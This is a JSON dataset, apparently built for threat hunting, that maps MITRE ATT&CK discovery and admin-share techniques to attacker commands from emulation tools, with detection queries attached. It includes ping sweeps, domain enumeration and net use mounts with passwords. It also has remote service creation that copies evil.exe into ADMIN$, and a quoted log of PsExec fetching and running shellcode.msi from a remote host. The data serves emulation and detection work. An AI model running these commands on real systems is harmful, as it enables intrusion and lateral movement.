"https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_site", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_site", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/reverse_dns", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/reverse_dns", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_computers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_computers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_domaincontrollers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_domaincontrollers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/gethostbyname", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/gethostbyname", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Bash\nC: \\ Users \\ administrator.0DAY> net view \\\\ ICBC.0day.org\nList is empty.", "name": "Bash"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "net group \"Domain Computers\" /domain[:DOMAIN]", "Cobalt Strike": "net group \"Domain Computers\" /domain", "Metasploit": "\npost/windows/gather/enum_ad_computers\npost/windows/gather/enum_computers", "Description": "Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$)"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "net group \"Domain Controllers\" /domain[:DOMAIN]", "Cobalt Strike": "net group \"Domain Controllers\" /domain", "Metasploit": "", "Description": "Display the list of domain controllers in the network"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "nltest /dclist[:domain]", "Cobalt Strike": "", "Metasploit": "", "Description": "Display the trust relationship between the workstation and the domain - must be elevated to use this!"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "echo %LOGONSERVER%", "Cobalt Strike": "shell echo %LOGONSERVER%", "Metasploit": "", "Description": "Display the active directory login server of the workstation "}}, {"Atomic Red Team Test - Remote System Discovery": {"attack_technique": "T1018", "display_name": "Remote System Discovery", "atomic_tests": [{"name": "Remote System Discovery - net", "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net view /domain\nnet view\n"}}, {"name": "Remote System Discovery - net group Domain Computers", "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net group \"Domain Computers\" /domain\n"}}, {"name": "Remote System Discovery - nltest", "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"target_domain": {"description": "Domain to query for domain controllers", "type": "String", "default": "domain.local"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "nltest.exe /dclist:#{target_domain}\n"}}, {"name": "Remote System Discovery - ping sweep", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i\n"}}, {"name": "Remote System Discovery - arp", "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "arp -a\n"}}, {"name": "Remote System Discovery - arp nix", "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n", "supported_platforms": ["linux", "macos"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if arp command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1;\n", "get_prereq_command": "echo \"Install arp on the machine.\"; exit 1;\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "arp -a | grep -v '^?'\n"}}, {"name": "Remote System Discovery - sweep", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active. \n", "supported_platforms": ["linux", "macos"], "input_arguments": {"subnet": {"description": "Subnet used for ping sweep.", "type": "string", "default": "192.168.1"}, "start_host": {"description": "Subnet used for ping sweep.", "type": "string", "default": 1}, "stop_host": {"description": "Subnet used for ping sweep.", "type": "string", "default": 254}}, "executor": {"name": "sh", "elevation_required": false, "command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n"}}, {"name": "Remote System Discovery - nslookup", "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout. \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n"}}]}}, {"Mitre Stockpile - Use PowerView to query the Active Directory server for a list of computers in the Domain": {"id": "13379ae1-d20e-4162-91f8-320d78a35e7f", "name": "Discover local hosts", "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "payloads": ["powerview.ps1"]}}}}}, {"Mitre Stockpile - Identify the remote domain controllers": {"id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "name": "Discover domain controller", "description": "Identify the remote domain controllers", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}}}, {"Mitre Stockpile - View the known_hosts file": {"id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633", "name": "Parse SSH known_hosts", "description": "View the known_hosts file", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}}}, {"Mitre Stockpile - Locate all active IP and FQDNs on the network": {"id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "name": "Collect ARP details", "description": "Locate all active IP and FQDNs on the network", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"darwin": {"sh": {"command": "arp -a"}}, "linux": {"sh": {"command": "arp -a"}}, "windows": {"psh,cmd": {"command": "arp -a"}}}}}, {"Mitre Stockpile - Identify remote domain controller": {"id": "b22b3b47-6219-4504-a2e6-ae8263e49fc3", "name": "Find domain controller", "description": "Identify remote domain controller", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}}}, {"Mitre Stockpile - Identify the organizations mail server": {"id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "name": "Discover Mail Server", "description": "Identify the organizations mail server", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"linux": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "darwin": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "windows": {"psh": {"command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}}}}, {"Mitre Stockpile - Find hostname of remote IP in domain": {"id": "fa4ed735-7006-4451-a578-b516f80e559f", "name": "Reverse nslookup IP", "description": "Find hostname of remote IP in domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}}}, {"Mitre Stockpile - Find hostname of remote host": {"id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903", "name": "Find Hostname", "description": "Find hostname of remote host", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}}}, {"Threat Hunting Tables": {"chain_id": "100165", "os": "windows", "parent_process": "net.exe", "commandline_string": "view /domain", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "remote_discovery", "mitre_attack": "T1018", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100166", "os": "windows", "parent_process": "qwinsta.exe", "commandline_string": "/server:", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "remote_discovery", "mitre_attack": "T1018", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100167", "os": "windows", "parent_process": "installutil.exe", "commandline_string": "/logfile= /LogToConsole=false /U *.dll", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "execution", "mitre_attack": "T1018", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_domain_controller", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_domain_controller\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_domain_policy", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_domain_policy\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_domain_trust", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_domain_trust\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_forest", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_forest\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_forest_domain", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_forest_domain\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_site", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_site\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/reverse_dns", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/reverse_dns\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_computers", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_computers\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_domaincontrollers", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_domaincontrollers\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/gethostbyname", "ATT&CK Technique #1": "T1018", "ATT&CK Technique #2": "", "Technique": "Remote System Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/gethostbyname\":  [\"T1018\"],"}}], "command_list": ["net group \"Domain Computers\" /domain[:DOMAIN]", "net group \"Domain Computers\" /domain", "\npost/windows/gather/enum_ad_computers\npost/windows/gather/enum_computers", "net group \"Domain Controllers\" /domain[:DOMAIN]", "net group \"Domain Controllers\" /domain", "nltest /dclist[:domain]", "echo %LOGONSERVER%", "shell echo %LOGONSERVER%", "net view /domain\nnet view\n", "net group \"Domain Computers\" /domain\n", "nltest.exe /dclist:domain.local\n", "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i\n", "arp -a\n", "arp -a | grep -v '^?'\n", "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done\n", null, null, "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "payloads": ["powerview.ps1"]}}}, {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}, {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}, {"darwin": {"sh": {"command": "arp -a"}}, "linux": {"sh": {"command": "arp -a"}}, "windows": {"psh,cmd": {"command": "arp -a"}}}, {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}, {"linux": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "darwin": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "windows": {"psh": {"command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}}, {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}, {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}, "net.exe view /domain", "qwinsta.exe /server:", "installutil.exe /logfile= /LogToConsole=false /U *.dll", "powershell/situational_awareness/network/powerview/get_domain_controller", "powershell/situational_awareness/network/powerview/get_domain_controller", "powershell/situational_awareness/network/powerview/get_domain_policy", "powershell/situational_awareness/network/powerview/get_domain_policy", "powershell/situational_awareness/network/powerview/get_domain_trust", "powershell/situational_awareness/network/powerview/get_domain_trust", "powershell/situational_awareness/network/powerview/get_forest", "powershell/situational_awareness/network/powerview/get_forest", "powershell/situational_awareness/network/powerview/get_forest_domain", "powershell/situational_awareness/network/powerview/get_forest_domain", "powershell/situational_awareness/network/powerview/get_site", "powershell/situational_awareness/network/powerview/get_site", "powershell/situational_awareness/network/reverse_dns", "powershell/situational_awareness/network/reverse_dns", "python/situational_awareness/network/active_directory/get_computers", "python/situational_awareness/network/active_directory/get_computers", "python/situational_awareness/network/active_directory/get_domaincontrollers", "python/situational_awareness/network/active_directory/get_domaincontrollers", "python/situational_awareness/network/gethostbyname", "python/situational_awareness/network/gethostbyname", "Bash\nC: \\ Users \\ administrator.0DAY> net view \\\\ ICBC.0day.org\nList is empty."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and (process_path contains \"net.exe\"or process_path contains \"ping.exe\")and (process_command_line contains \"view\"or process_command_line contains \"ping\")", "name": "Remote System Discovery Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where (process_path contains \"net.exe\"or process_path contains \"ping.exe\")and (process_command_line contains \"view\"or process_command_line contains \"ping\")", "name": "Remote System Discovery Process"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows net view command execution\ndescription: windows server 2016\nreferences: No\ntags: T1018\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net view * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1077", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\nnet use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator (checking password reuse on local admin account)", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "name": "Cobalt Strike"}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\#{computer_name}\\C$ #{password} /u:#{user_name}\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:DOMAIN\\Administrator\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} P@ssw0rd1 /u:#{user_name}\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\Target\\#{share_name} #{password} /u:#{user_name}\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\C$\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\Target\\#{share_name}\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "New-PSDrive -name g -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "psexec.exe \\\\localhost -c #{command_path}\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "psexec.exe #{remote_host} -c C:\\Windows\\System32\\cmd.exe\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n", "name": null}, {"source": "data/abilities/lateral-movement/40161ad0-75bd-11e9-b475-0800200c9a66.yml", "command": {"windows": {"psh": {"command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n", "cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n"}}}, "name": "Mounts a network file share on a target computer"}, {"source": "data/abilities/lateral-movement/aa6ec4dd-db09-4925-b9b9-43adeb154686.yml", "command": {"windows": {"psh": {"command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "name": "Mount a windows share"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nwindows security log\nEventID: 4688\nProcess information:\nNew Process ID: 0xe84\nNew Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\ PsExec.exe\n\nEventID: 4688\nProcess information:\nNew Process ID: 0xfcc\nNew Process Name: C: \\ Windows \\ PSEXESVC.exe\n\nEVentID: 5140\nInternet Information:\nObject Type: File\nSource Address: fe80 :: 719e: d312: 648f: 4884\nSource Port: 49369\nShare information:\nShare name: \\\\ * \\ IPC $\n\nEventID: 5145\nInternet Information:\nObject Type: File\nSource Address: fe80 :: 719e: d312: 648f: 4884\nSource Port: 49369\n\nShare information:\nShare Name: \\\\ * \\ IPC $\nShare path:\nRelative Target Name: PSEXESVC\n\nSYSMON log\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15: 09: 29.237\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}\nProcessId: 3716\nImage: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\ PsExec.exe\nFileVersion: 2.2\nDescription: Execute processes remotely\nProduct: Sysinternals PsExec\nCompany: Sysinternals - www.sysinternals.com\nOriginalFileName: psexec.c\nCommandLine: PsExec.exe -d -s msiexec.exe / q / i http://192.168.126.146/shellcode.msi\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\nLogonId: 0x6e1ea\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = E50D9E3BD91908E13A26B3E23EDEAF577FB3A095\nParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}\nParentProcessId: 3492\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ System32 \\ cmd.exe\"\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15: 09: 29.284\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\nProcessId: 4044\nImage: C: \\ Windows \\ PSEXESVC.exe\nFileVersion: 2.2\nDescription: PsExec Service\nProduct: Sysinternals PsExec\nCompany: Sysinternals\nOriginalFileName: psexesvc.exe\nCommandLine: C: \\ Windows \\ PSEXESVC.exe\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: NT AUTHORITY \\ SYSTEM\nLogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1 = A17C21B909C56D93D978014E63FB06926EAEA8E7\nParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}\nParentProcessId: 496\nParentImage: C: \\ Windows \\ System32 \\ services.exe\nParentCommandLine: C: \\ Windows \\ system32 \\ services.exe\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15: 09: 29.440\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}\nProcessId: 1916\nImage: C: \\ Windows \\ System32 \\ msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: \"msiexec.exe\" / q / i http://192.168.126.146/shellcode.msi\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: NT AUTHORITY \\ SYSTEM\nLogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\nParentProcessId: 4044\nParentImage: C: \\ Windows \\ PSEXESVC.exe\nParentCommandLine: C: \\ Windows \\ PSEXESVC.exe", "name": "Log"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1077", "Built-in Windows Command": "net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\nnet use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator (checking password reuse on local admin account)", "Cobalt Strike": "shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]", "Metasploit": "", "Description": "Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them."}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1077", "Built-in Windows Command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Cobalt Strike": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "Metasploit": "", "Description": "This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up 